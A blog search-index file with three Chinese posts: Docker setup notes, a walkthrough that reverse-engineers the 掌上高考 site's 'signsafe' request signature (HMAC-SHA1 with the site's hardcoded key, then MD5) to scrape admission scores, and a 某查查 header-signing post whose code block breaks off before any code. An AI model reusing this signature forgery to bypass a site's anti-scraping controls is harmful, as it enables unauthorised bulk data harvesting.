<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Docker学习笔记</title>
      <link href="/posts/2740/"/>
      <url>/posts/2740/</url>
      
        <content type="html"><![CDATA[<h2 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h2><h3 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h3><p>卸载旧版</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo yum remove docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-engine</span><br></pre></td></tr></table></figure><p>安装yum-utils和设置存储库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y yum-utils</span><br><span class="line">sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><p>安装docker</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</span><br></pre></td></tr></table></figure><p>启动docker: <code>sudo systemctl start docker</code></p><p>设置开机启动docker: <code>sudo systemctl enable docker</code></p><h3 id="其他系统待补"><a href="#其他系统待补" class="headerlink" title="其他系统待补"></a>其他系统待补</h3><h2 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h2><h3 id="运行mysql"><a href="#运行mysql" class="headerlink" title="运行mysql"></a>运行mysql</h3><p>使用docker启动一个mysql服务，快速搭建mysql环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name mysql -p 3306:3306 -e TZ=Asia/Shanghai -e MYSQL_ROOT_PASSWORD=123456 mysql</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@C20240512126438 ~]# docker run -d --name mysql -p 3306:3306 -e TZ=Asia/Shanghai -e MYSQL_ROOT_PASSWORD=123456 mysql</span><br><span class="line">Unable to find image &#x27;mysql:latest&#x27; locally</span><br><span class="line">latest: Pulling from library/mysql</span><br><span class="line">fcbdc4090331: Pull complete </span><br><span class="line">95eb5073c36f: Pull complete </span><br><span class="line">5e5ba0e6412a: Pull complete </span><br><span class="line">ee4654eb29b7: Pull complete </span><br><span class="line">1d2218160b86: Pull complete </span><br><span class="line">bbe712936412: Pull complete </span><br><span class="line">4a6efa152609: Pull complete </span><br><span class="line">0f7c3b67bb2b: Pull complete </span><br><span class="line">7ccd17e83c8a: Pull complete </span><br><span class="line">04bf2c116556: Pull complete </span><br><span class="line">Digest: sha256:4a4e5e2a19aab7a67870588952e8f401e17a330466ecfc55c9acf51196da5bd0</span><br><span class="line">Status: Downloaded newer image for mysql:latest</span><br><span class="line">a0b6b2aedec8d71473e0f0309b6eabac909d4779b04a79506a3e9fda1af527bb</span><br></pre></td></tr></table></figure><p>上面是安装最新版的mysql，我测试的时候是8.x</p><p>如果要指定版本的mysql，可以这么写：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name mysql -p 3306:3306 -e TZ=Asia/Shanghai -e MYSQL_ROOT_PASSWORD=123456 mysql:5.7</span><br></pre></td></tr></table></figure><p>其实还可以先拉取镜像，后启动容器；下面的也是可以的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql:5.7</span><br><span class="line">docker run -d --name mysql -p 3306:3306 -e TZ=Asia/Shanghai -e MYSQL_ROOT_PASSWORD=123456 mysql:5.7</span><br></pre></td></tr></table></figure><p>pull命令可以省略，run的时候如果在本地找不到镜像，就会去docker hub拉取</p><h3 id="参数解析"><a href="#参数解析" class="headerlink" title="参数解析"></a>参数解析</h3><p>-d 后台运行</p><p>–name 容器名称 必须唯一</p><p>-p 端口映射 宿主主机端口:容器端口</p><p>-e 环境变量 变量名&#x3D;值</p><p>mysql:5.7 镜像名  名称:标签（版本）</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="镜像操作"><a href="#镜像操作" class="headerlink" title="镜像操作"></a>镜像操作</h3><p><strong>查看本地所有镜像：<code>docker images</code></strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@C20240512126438 ~]# docker images</span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">nginx        latest    1d668e06f1e5   8 days ago     188MB</span><br><span class="line">mysql        5.7       5107333e08a8   5 months ago   501MB</span><br></pre></td></tr></table></figure><p>REPOSITORY：镜像名称</p><p>TAG： 标签 版本</p><p>IMAGE ID： 镜像ID</p><p>CREATED：创建时间</p><p>SIZE： 镜像大小</p><p><strong>删除指定镜像： <code>docker rmi 1d668e06f1e5</code></strong></p><p>使用镜像名称也是可以的，例如：<code>docker rmi mysql</code>; 如果忽略tag，默认删除latest，如果不存在latest则报错</p><p><strong>保存（压缩）镜像：<code>docker save -o mysql_57.tar mysql:5.7</code></strong> </p><p><strong>加载（解压）镜像：<code>docker load -i mysql_57.tar</code></strong></p><h3 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h3><p>创建并运行容器：<code>docker run 参数</code></p><p>查看所有容器：<code>docker ps -a</code></p><p>查看正在运行容器：<code>docker ps</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@C20240512126438 ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND                  CREATED          STATUS          PORTS                                                  NAMES</span><br><span class="line">841e2f17cc2b   mysql     &quot;docker-entrypoint.s…&quot;   3 minutes ago    Up 3 minutes    33060/tcp, 0.0.0.0:3307-&gt;3306/tcp, :::3307-&gt;3306/tcp   mysql</span><br><span class="line">7207ac323407   nginx     &quot;/docker-entrypoint.…&quot;   54 minutes ago   Up 54 minutes   0.0.0.0:80-&gt;80/tcp, :::80-&gt;80/tcp                      nginx</span><br></pre></td></tr></table></figure><p>CONTAINER ID: 容器ID</p><p>IMAGE： 镜像名称</p><p>COMMAND：容器内服务器启动命令</p><p>CREATED：创建时间</p><p>STATUS： 状态 UP表示运行中</p><p>PORTS： 端口映射关系</p><p>NAMES： 容器名称</p><p>停止容器：<code>docker stop 容器ID或容器名称 </code></p><p>重启容器：<code>docker restart 容器ID或容器名称</code></p><p>启动容器：<code>docker start 容器ID或容器名称</code></p><p>删除容器：<code>docker rm 容器ID或容器名称</code>  加上<code>-f</code>参数可以强制删除运行中的容器</p><p>查看日志：<code>docker logs 容器ID或容器名称</code>  加上<code>-f</code>参数可实时查看日志更新</p><p>进入容器：<code>docker exec -it 容器ID或容器名称 bash</code></p><p>执行命令：<code>docker exec -it mysql mysql -uroot -p</code></p><h2 id="制作镜像"><a href="#制作镜像" class="headerlink" title="制作镜像"></a>制作镜像</h2>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> 分布式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【原创】掌上高考专业分数线js逆向</title>
      <link href="/posts/ca3c/"/>
      <url>/posts/ca3c/</url>
      
        <content type="html"><![CDATA[<p>需求分析：爬取掌上高考每一年的专业录取分数</p><p>声明：本文章只用于学习研究，禁止用于但不限于商业用途、批量爬取<img src="https://img.xpctf.cn/img/202204092310211.png"></p><p><strong>抓包</strong></p><p>因为换页要求登录，所以我们打开开发者工具以后点下一年就会重新发数据包</p><p><img src="https://img.xpctf.cn/img/202204092311468.png"></p><p>分析后发现这个数据包就是请求的数据，返回数据和请求包都有加密，请求包里有个signsafe参数</p><p><img src="https://img.xpctf.cn/img/202204092311437.png"></p><p><strong>分析请求包</strong></p><p>ctrl+shift+f全局搜索signsafe，发现有两个js文件包含signsafe</p><p><img src="https://img.xpctf.cn/img/202204092311407.png"></p><p>先点开最后一个看，格式化以后继续搜索signsafe，发现uri是sendsmscode的，继续看看另外一个包（猜测：算法应该一样的，直接扣这个应该也可以）</p><p><img src="https://img.xpctf.cn/img/202204092311804.png"></p><p>发现只要带有signsafe的都是p赋值的，直接在p赋值的地方打上断点，然后继续发送请求包分析</p><p><img src="https://img.xpctf.cn/img/202204092311347.png"></p><p>认真看一下js代码，发现是url进行了HmacSHA1加密，密钥是常量D23ABC@#56，直接使用python改写</p><p><img src="https://img.xpctf.cn/img/202204092311667.png"></p><p><strong>signsafe加密代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_hmac</span>(<span class="params">key, code</span>):</span><br><span class="line">    hmac_code = hmac.new(key.encode(), code.encode(), sha1).digest()</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(hmac_code).decode()</span><br><span class="line"></span><br><span class="line">t = <span class="string">&#x27;api.eol.cn/web/api/?local_batch_id=7&amp;local_province_id=53&amp;local_type_id=1&amp;page=1&amp;school_id=263&amp;size=10&amp;special_group=&amp;uri=apidata/api/gk/score/special&amp;year=2020&#x27;</span></span><br><span class="line">k = <span class="string">&#x27;D23ABC@#56&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(hash_hmac(k, t))</span><br></pre></td></tr></table></figure><p>结果和网站js加密的一致，还有一个c()(g)，盲猜md5，结果猜对了</p><p><img src="https://img.xpctf.cn/img/202204092311298.png"></p><p><img src="https://img.xpctf.cn/img/202204092311749.png"></p><p>加了md5以后结果和网站一致，signsafe参数逆向结束，这里不提供爬虫完整代码</p><p><img src="https://img.xpctf.cn/img/202204092311101.png"></p><p><strong>返回数据分析</strong></p><p>看响应包应该是aes加密，我们先搜搜aes解密的特征（如果有混淆就无效）：AES.encrypt、aes.encrypt、AES.decrypt、aes.decrypt</p><p><img src="https://img.xpctf.cn/img/202204092311447.png"></p><p>很荣幸我们搜到了，进去看看是不是解密的地方，decrypt是解密，encrypt是加密， 別搞混了</p><p><img src="https://img.xpctf.cn/img/202204092312374.png"></p><p>看到这代码，熟悉的味道，这肯定是webpack，之前看过一篇自动扣webpack的文章里面有工具，我忘记收藏了，度娘一波</p><p>找到一篇文章：<a href="https://blog.csdn.net/zjq592767809/article/details/122355530%EF%BC%8C%E8%8A%B1%E4%BA%8630%E7%A7%92%E7%9C%8B%E5%AE%8C%E6%96%87%E7%AB%A0%E4%BB%A5%E5%90%8E%E5%BC%80%E5%A7%8B%E5%AE%9E%E6%93%8D%EF%BC%8C%E7%A0%94%E7%A9%B6%E4%BA%86%E4%B8%80%E4%B8%8B%EF%BC%8C%E4%B8%8D%E5%A4%AA%E6%96%B9%E4%BE%BF%EF%BC%8C%E8%A6%81%E5%AE%89%E8%A3%85%E5%BE%88%E5%A4%9A%E4%BE%9D%E8%B5%96%EF%BC%8C%E8%80%8C%E4%B8%94%E4%B8%8D%E6%98%AF%E9%80%9A%E7%94%A8%E7%9A%84%EF%BC%8C%E8%BF%98%E4%B8%8D%E5%A6%82%E8%87%AA%E5%B7%B1%E6%89%A3%EF%BC%8Ce%E5%92%8Cn%E6%98%AF%E5%8F%AF%E4%BB%A5%E5%86%99%E6%AD%BB%E7%9A%84%EF%BC%8Ca%E5%B0%B1%E6%98%AFtext%E5%8A%A0%E5%AF%86%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%9B%E5%AE%8C%E7%BB%93%E6%92%92%E8%8A%B1%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81">https://blog.csdn.net/zjq592767809/article/details/122355530，花了30秒看完文章以后开始实操，研究了一下，不太方便，要安装很多依赖，而且不是通用的，还不如自己扣，e和n是可以写死的，a就是text加密字符串；完结撒花！！！！</a></p><p><img src="https://img.xpctf.cn/img/202204092312324.png"></p><p>由于js解密代码6万多行，就不贴代码出来了，需要的可以留言，仅供学习研究！！！</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【原创】某查查协议头参数272a7bfd6c84f9233ae1逆向加密代码</title>
      <link href="/posts/9650/"/>
      <url>/posts/9650/</url>
      
        <content type="html"><![CDATA[<p>环境：node.js(V8)</p><p>逆向过程略,代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span 